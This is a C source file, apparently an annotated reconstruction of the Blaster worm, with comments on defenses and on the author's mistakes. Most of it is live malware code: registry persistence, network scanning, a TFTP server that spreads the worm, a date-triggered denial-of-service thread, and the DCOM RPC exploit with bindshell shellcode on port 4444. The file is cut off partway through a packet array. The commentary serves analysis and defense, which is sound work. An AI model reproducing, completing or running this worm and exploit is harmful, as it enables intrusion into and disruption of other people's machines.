#include <winsock2.h>
#include <ws2tcpip.h> /*IP_HDRINCL*/
#include <wininet.h> /*InternetGetConnectedState*/
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "advapi32.lib")


/*
* These strings aren't used in the worm, Buford put them here
* so that whitehat researchers would discover them.
* BUFORD: Note that both of these messages are the typical
* behavior of a teenager who recently discovered love, and
* is in the normal teenage mode of challenging authority.
*/
const char msg1[]="I just want to say LOVE YOU SAN!!";
const char msg2[]="billy gates why do you make this possible ?"
" Stop making money and fix your software!!";


/*
* Buford probably put the worm name as a "define" at the top
* of his program so that he could change the name at any time.
* 2003-09-29: This is the string that Parson changed.
*/
#define MSBLAST_EXE "msblast.exe"

/*
* MS-RPC/DCOM runs over port 135.
* DEFENSE: firewalling port 135 will prevent systems from
* being exploited and will hinder the spread of this worm.
*/
#define MSRCP_PORT_135 135

/*
* The TFTP protocol is defined to run on port 69. Once this
* worm breaks into a victim, it will command it to download
* the worm via TFTP. Therefore, the worms briefly runs a
* TFTP service to deliver that file.
* DEFENSE: firewalling 69/udp will prevent the worm from
* fully infected a host.
*/
#define TFTP_PORT_69 69

/*
* The shell-prompt is established over port 4444. The 
* exploit code (in the variable 'sc') commands the victim
* to "bind a shell" on this port. The exploit then connects
* to that port to send commands, such as TFTPing the 
* msblast.exe file down and launching it.
* DEFENSE: firewalling 4444/tcp will prevent the worm from
* spreading.
*/
#define SHELL_PORT_4444 4444


/*
* A simple string to hold the current IP address
*/
char target_ip_string[16];

/*
* A global variable to hold the socket for the TFTP service.
*/
int fd_tftp_service;

/* 
* Global flag to indicate this thread is running. This
* is set when the thread starts, then is cleared when
* the thread is about to end.
* This demonstrates that Buford isn't confident with
* multi-threaded programming -- he should just check
* the thread handle.
*/
int is_tftp_running;

/* 
* When delivering the worm file to the victim, it gets the
* name by querying itself using GetModuleFilename(). This
* makes it easier to change the filename or to launch the
* worm. */
char msblast_filename[256+4];

int ClassD, ClassC, ClassB, ClassA;

int local_class_a, local_class_b;

int winxp1_or_win2k2;


ULONG WINAPI blaster_DoS_thread(LPVOID);
void blaster_spreader();
void blaster_exploit_target(int fd, const char *victim_ip);
void blaster_send_syn_packet(int target_ip, int fd);


/*************************************************************** 
* This is where the 'msblast.exe' program starts running
***************************************************************/
void main(int argc, char *argv[]) 
{ 
WSADATA WSAData; 
char myhostname[512]; 
char daystring[3];
char monthstring[3]; 
HKEY hKey;
int ThreadId;
register unsigned long scan_local=0; 

/*
* Create a registry key that will cause this worm
* to run every time the system restarts.
* DEFENSE: Slammer was "memory-resident" and could
* be cleaned by simply rebooting the machine.
* Cleaning this worm requires this registry entry
* to be deleted.
*/
RegCreateKeyEx(
/*hKey*/ HKEY_LOCAL_MACHINE, 
/*lpSubKey*/ "SOFTWARE\\Microsoft\\Windows\\"
"CurrentVersion\\Run",
/*Reserved*/ 0,
/*lpClass*/ NULL,
/*dwOptions*/ REG_OPTION_NON_VOLATILE,
/*samDesired */ KEY_ALL_ACCESS,
/*lpSecurityAttributes*/ NULL, 
/*phkResult */ &hKey,
/*lpdwDisposition */ 0);
RegSetValueExA(
hKey, 
"windows auto update", 
0, 
REG_SZ, 
MSBLAST_EXE, 
50);
RegCloseKey(hKey); 


/*
* Make sure this isn't a second infection. A common problem
* with worms is that they sometimes re-infect the same
* victim repeatedly, eventually crashing it. A crashed 
* system cannot spread the worm. Therefore, worm writers
* now make sure to prevent reinfections. The way Blaster
* does this is by creating a system "global" object called
* "BILLY". If another program in the computer has already
* created "BILLY", then this instance won't run.
* DEFENSE: this implies that you can remove Blaster by 
* creating a mutex named "BILLY". When the computer 
* restarts, Blaster will falsely believe that it has
* already infected the system and will quit. 
*/
CreateMutexA(NULL, TRUE, "BILLY"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 

/*
* Windows systems requires "WinSock" (the network API layer)
* to be initialized. Note that the SYNflood attack requires
* raw sockets to be initialized, which only works in
* version 2.2 of WinSock.
* BUFORD: The following initialization is needlessly
* complicated, and is typical of programmers who are unsure
* of their knowledge of sockets..
*/
if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0
&& WSAStartup(MAKEWORD(1,1), &WSAData) != 0
&& WSAStartup(1, &WSAData) != 0)
return;

/*
* The worm needs to read itself from the disk when 
* transferring to the victim. Rather than using a hard-coded
* location, it discovered the location of itself dynamically
* through this function call. This has the side effect of
* making it easier to change the name of the worm, as well
* as making it easier to launch it.
*/
GetModuleFileNameA(NULL, msblast_filename,
sizeof(msblast_filename)); 

/*
* When the worm infects a dialup machine, every time the user
* restarts their machine, the worm's network communication
* will cause annoying 'dial' popups for the user. This will
* make them suspect their machine is infected.
* The function call below makes sure that the worm only
* starts running once the connection to the Internet
* has been established and not before.
* BUFORD: I think Buford tested out his code on a machine
* and discovered this problem. Even though much of the
* code indicates he didn't spend much time on
* testing his worm, this line indicates that he did
* at least a little bit of testing.
*/
while (!InternetGetConnectedState(&ThreadId, 0))
Sleep (20000); /*wait 20 seconds and try again */

/*
* Initialize the low-order byte of target IP address to 0.
*/
ClassD = 0;

/*
* The worm must make decisions "randomly": each worm must
* choose different systems to infect. In order to make
* random choices, the programmer must "seed" the random
* number generator. The typical way to do this is by
* seeding it with the current timestamp.
* BUFORD: Later in this code you'll find that Buford calls
* 'srand()' many times to reseed. This is largely
* unnecessary, and again indicates that Buford is not 
* confident in his programming skills, so he constantly
* reseeds the generator in order to make extra sure he
* has gotten it right.
*/
srand(GetTickCount()); 

/*
* This initializes the "local" network to some random
* value. The code below will attempt to figure out what
* the true local network is -- but just in case it fails,
* the initialization fails, using random values makes sure
* the worm won't do something stupid, such as scan the
* network around 0.0.0.0
*/
local_class_a = (rand() % 254)+1; 
local_class_b = (rand() % 254)+1; 

/*
* This discovers the local IP address used currently by this
* victim machine. Blaster randomly chooses to either infect
* just the local ClassB network, or some other network,
* therefore it needs to know the local network.
* BUFORD: The worm writer uses a complex way to print out
* the IP address into a string, then parse it back again
* to a number. This demonstrates that Buford is fairly
* new to C programming: he thinks in terms of the printed
* representation of the IP address rather than in its
* binary form.
*/
if (gethostname(myhostname, sizeof(myhostname)) != -1) {
HOSTENT *p_hostent = gethostbyname(myhostname);

if (p_hostent != NULL && p_hostent->h_addr != NULL) {
struct in_addr in; 
const char *p_addr_item;

memcpy(&in, p_hostent->h_addr, sizeof(in));
sprintf(myhostname, "%s", inet_ntoa(in)); 

p_addr_item = strtok(myhostname, ".");
ClassA = atoi(p_addr_item); 

p_addr_item = strtok(0, ".");
ClassB = atoi(p_addr_item);

p_addr_item = strtok(0, ".");
ClassC = atoi(p_addr_item);

if (ClassC > 20) { 
/* When starting from victim's address range, 
* try to start a little bit behind. This is
* important because the scanning logic only
* move forward. */
srand(GetTickCount()); 
ClassC -= (rand() % 20); 
} 
local_class_a = ClassA; 
local_class_b = ClassB; 
scan_local = TRUE; 
}
}


/*
* This chooses whether Blaster will scan just the local
* network (40% chance) or a random network (60% chance)
*/
srand(GetTickCount()); 
if ((rand() % 20) < 12) 
scan_local = FALSE;

/*
* The known exploits require the hacker to indicate whether 
* the victim is WinXP or Win2k. The worm has to guess. The
* way it guesses is that it chooses randomly. 80% of the time
* it will assume that all victims are WinXP, and 20% of the
* time it will assume all victims are Win2k. This means that
* propogation among Win2k machines will be slowed down by
* the fact Win2k machines are getting DoSed faster than they
* are getting exploited. 
*/
winxp1_or_win2k2 = 1; 
if ((rand()%10) > 7) 
winxp1_or_win2k2 = 2; 

/*
* If not scanning locally, then choose a random IP address
* to start with.
* BUG: this worm choose bad ranges above 224. This will 
* cause a bunch of unnecessary multicast traffic. Weird
* multicast traffic has historically been an easy way of 
* detecting worm activity.
*/
if (!scan_local) { 
ClassA = (rand() % 254)+1; 
ClassB = (rand() % 254); 
ClassC = (rand() % 254); 
}


/*
* Check the date so that when in the certain range, it will 
* trigger a DoS attack against Micosoft. The following
* times will trigger the DoS attack:
* Aug 16 through Aug 31
* Spt 16 through Spt 30
* Oct 16 through Oct 31
* Nov 16 through Nov 30
* Dec 16 through Dec 31
* This applies to all years, and is based on local time.
* FAQ: The worm is based on "local", not "global" time.
* That means the DoS attack will start from Japan,
* then Asia, then Europe, then the United States as the
* time moves across the globe.
*/
#define MYLANG MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT)
#define LOCALE_409 MAKELCID(MYLANG, SORT_DEFAULT)
GetDateFormat( LOCALE_409, 
0, 
NULL, /*localtime, not GMT*/ 
"d", 
daystring, 
sizeof(daystring)); 
GetDateFormat( LOCALE_409, 
0, 
NULL, /*localtime, not GMT*/ 
"M", 
monthstring, 
sizeof(monthstring));
if (atoi(daystring) > 15 && atoi(monthstring) > 8)
CreateThread(NULL, 0, 
blaster_DoS_thread, 
0, 0, &ThreadId); 

/*
* As the final task of the program, go into worm mode
* trying to infect systems.
*/
for (;;)
blaster_spreader();

/*
* It'll never reach this point, but in theory, you need a
* WSACleanup() after a WSAStartup().
*/
WSACleanup();
} 



/*
* This will be called from CreateThread in the main worm body
* right after it connects to port 4444. After the thread is 
* started, it then sends the string "
* tftp -i %d.%d.%d.%d GET msblast.exe" (where the %ds represents
* the IP address of the attacker).
* Once it sends the string, it then waits for 20 seconds for the
* TFTP server to end. If the TFTP server doesn't end, it calls
* TerminateThread.
*/
DWORD WINAPI blaster_tftp_thread(LPVOID p)
{
/*
* This is the protocol format of a TFTP packet. This isn't
* used in the code -- I just provide it here for reference
*/
struct TFTP_Packet
{
short opcode;
short block_id;
char data[512];
};

char reqbuf[512]; /* request packet buffer */
struct sockaddr_in server; /* server-side port number */
struct sockaddr_in client; /* client IP address and port */
int sizeof_client; /* size of the client structure*/
char rspbuf[512]; /* response packet */

static int fd; /* the socket for the server*/
register FILE *fp;
register block_id;
register int block_size;

/* Set a flag indicating this thread is running. The other 
* thread will check this for 20 seconds to see if the TFTP
* service is still alive. If this thread is still alive in
* 20 seconds, it will be killed.
*/
is_tftp_running = TRUE; /*1 == TRUE*/

/* Create a server-socket to listen for UDP requests on */
fd = socket(AF_INET, SOCK_DGRAM, 0);
if (fd == SOCKET_ERROR)
goto closesocket_and_exit;

/* Bind the socket to 69/udp */
memset(&server, 0, sizeof(server));
server.sin_family = AF_INET;
server.sin_port = htons(TFTP_PORT_69); 
server.sin_addr.s_addr = 0; /*TFTP server addr = <any>*/
if (bind(fd, (struct sockaddr*)&server, sizeof(server)) != 0)
goto closesocket_and_exit;

/* Receive a packet, any packet. The contents of the received
* packet are ignored. This means, BTW, that a defensive 
* "worm-kill" could send a packet from somewhere else. This
* will cause the TFTP server to download the msblast.exe
* file to the wrong location, preventing the victim from
* doing the download. */
sizeof_client = sizeof(client);
if (recvfrom(fd, reqbuf, sizeof(reqbuf), 0, 
(struct sockaddr*)&client, &sizeof_client) <= 0)
goto closesocket_and_exit;

/* The TFTP server will respond with many 512 byte blocks
* until it has completely sent the file; each block must
* have a unique ID, and each block must be acknowledged.
* BUFORD: The worm ignores TFTP ACKs. This is probably why
* the worm restarts the TFTP service rather than leaving it
* enabled: it essentially flushes all the ACKs from the 
* the incoming packet queue. If the ACKs aren't flushed,
* the worm will incorrectly treat them as TFTP requests.
*/
block_id = 0;

/* Open this file. GetModuleFilename was used to figure out
* this filename. */
fp = fopen(msblast_filename, "rb");
if (fp == NULL)
goto closesocket_and_exit;

/* Continue sending file fragments until none are left */
for (;;) {
block_id++;

/* Build TFTP header */
#define TFTP_OPCODE_DATA 3
*(short*)(rspbuf+0) = htons(TFTP_OPCODE_DATA);
*(short*)(rspbuf+2)= htons((short)block_id);

/* Read next block of data (about 12 blocks total need
* to be read) */
block_size = fread(rspbuf+4, 1, 512, fp);

/* Increase the effective length to include the TFTP
* head built above */
block_size += 4;

/* Send this block */
if (sendto(fd, (char*)&rspbuf, block_size, 
0, (struct sockaddr*)&client, sizeof_client) <= 0)
break;

/* Sleep for a bit.
* The reason for this is because the worm doesn't care
* about retransmits -- it therefore must send these 
* packets slow enough so congestion doesn't drop them.
* If it misses a packet, then it will DoS the victim
* without actually infecting it. Worse: the intended
* victim will continue to send packets, preventing the
* worm from infecting new systems because the 
* requests will misdirect TFTP. This design is very
* bad, and is my bet as the biggest single factor
* that slows down the worm. */
Sleep(900);

/* File transfer ends when the last block is read, which
* will likely be smaller than a full-sized block*/
if (block_size != sizeof(rspbuf)) {
fclose(fp);
fp = NULL;
break;
}
} 

if (fp != NULL)
fclose(fp);

closesocket_and_exit:

/* Notify that the thread has stopped, so that the waiting 
* thread can continue on */
is_tftp_running = FALSE;
closesocket(fd);
ExitThread(0);

return 0;
}




/*
* This function increments the IP address. 
* BUFORD: This conversion from numbers, to strings, then back
* to number is overly complicated. Experienced programmers
* would simply store the number and increment it. This shows
* that Buford does not have much experience work with
* IP addresses.
*/
void blaster_increment_ip_address()
{
for (;;) {
if (ClassD <= 254) {
ClassD++;
return;
}

ClassD = 0;
ClassC++;
if (ClassC <= 254)
return;
ClassC = 0;
ClassB++;
if (ClassB <= 254)
return;
ClassB = 0;
ClassA++;
if (ClassA <= 254)
continue;
ClassA = 0;
return;
}
}


/*
* This is called from the main() function in an
* infinite loop. It scans the next 20 addresses,
* then exits.
*/
void blaster_spreader()
{
fd_set writefds;

register int i;
struct sockaddr_in sin;
struct sockaddr_in peer;
int sizeof_peer;
int sockarray[20];
int opt = 1;
const char *victim_ip;

/* Create the beginnings of a "socket-address" structure that
* will be used repeatedly below on the 'connect()' call for
* each socket. This structure specified port 135, which is
* the port used for RPC/DCOM. */
memset(&sin, 0, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_port = htons(MSRCP_PORT_135);

/* Create an array of 20 socket descriptors */
for (i=0; i<20; i++) {
sockarray[i] = socket(AF_INET, SOCK_STREAM, 0);
if (sockarray[i] == -1)
return;
ioctlsocket(sockarray[i], FIONBIO , &opt);
}

/* Initiate a "non-blocking" connection on all 20 sockets
* that were created above.
* FAQ: Essentially, this means that the worm has 20 
* "threads" -- even though they aren't true threads.
*/
for (i=0; i<20; i++) {
int ip;

blaster_increment_ip_address();
sprintf(target_ip_string, "%i.%i.%i.%i", 
ClassA, ClassB, ClassC, ClassD);

ip = inet_addr(target_ip_string);
if (ip == -1)
return;
sin.sin_addr.s_addr = ip;
connect(sockarray[i],(struct sockaddr*)&sin,sizeof(sin));
}

/* Wait 1.8-seconds for a connection.
* BUG: this is often not enough, especially when a packet
* is lost due to congestion. A small timeout actually makes
* the worm slower than faster */
Sleep(1800);

/* Now test to see which of those 20 connections succeeded.
* BUFORD: a more experienced programmer would have done
* a single 'select()' across all sockets rather than
* repeated calls for each socket. */
for (i=0; i<20; i++) {
struct timeval timeout;
int nfds;

timeout.tv_sec = 0;
timeout.tv_usec = 0;
nfds = 0;

FD_ZERO(&writefds);
FD_SET((unsigned)sockarray[i], &writefds);

if (select(0, NULL, &writefds, NULL, &timeout) != 1) {
closesocket(sockarray[i]);
} else {
sizeof_peer = sizeof(peer);
getpeername(sockarray[i],
(struct sockaddr*)&peer, &sizeof_peer); 
victim_ip = inet_ntoa(peer.sin_addr);

/* If connection succeeds, exploit the victim */
blaster_exploit_target(sockarray[i], victim_ip);
closesocket(sockarray[i]);
}
}

}

/*
* This is where the victim is actually exploited. It is the same
* exploit as created by xfocus and altered by HDMoore.
* There are a couple of differences. The first is that the in
* those older exploits, this function itself would create the
* socket and connect, whereas in Blaster, the socket is already
* connected to the victim via the scanning function above. The
* second difference is that the packets/shellcode blocks are
* declared as stack variables rather than as static globals.
* Finally, whereas the older exploits give the hacker a 
* "shell prompt", this one automates usage of the shell-prompt
* to tell the victim to TFTP the worm down and run it.
*/
void blaster_exploit_target(int sock, const char *victim_ip)
{

/* These blocks of data are just the same ones copied from the
* xfocus exploit prototype. Whereas the original exploit
* declared these as "static" variables, Blaster declares
* these as "stack" variables. This is because the xfocus
* exploit altered them -- they must be reset back to their
* original values every time. */
unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,

0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,

0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};



unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00

,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45

,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E

,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D

,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41

,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00

,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45

,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00

,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00

,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03

,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00

,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29

,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00

,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00

,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10

,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF

,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10

,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09

,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00

,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00

,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00

,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00

,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01

,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03

,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00

,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E

,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00

,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00

,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00

,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00

,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x5C,0x00
,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00

,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00

,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00

,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};


unsigned char sc[]=
"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"
"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
"\x46\x00\x58\x00\x46\x00\x58\x00"

"\xff\xff\xff\xff" /* return address */

"\xcc\xe0\xfd\x7f" /* primary thread data block */
"\xcc\xe0\xfd\x7f" /* primary thread data block */

/* port 4444 bindshell */
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
"\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
"\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
"\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
"\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
"\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
"\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
"\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"
"\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
"\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
"\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
"\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
"\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
"\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
"\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
"\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
"\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
"\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
"\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
"\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
"\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
"\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
"\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
"\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
"\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
"\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
"\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
"\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
"\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
"\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
"\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
"\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";



unsigned char request4[]={
0x01,0x10
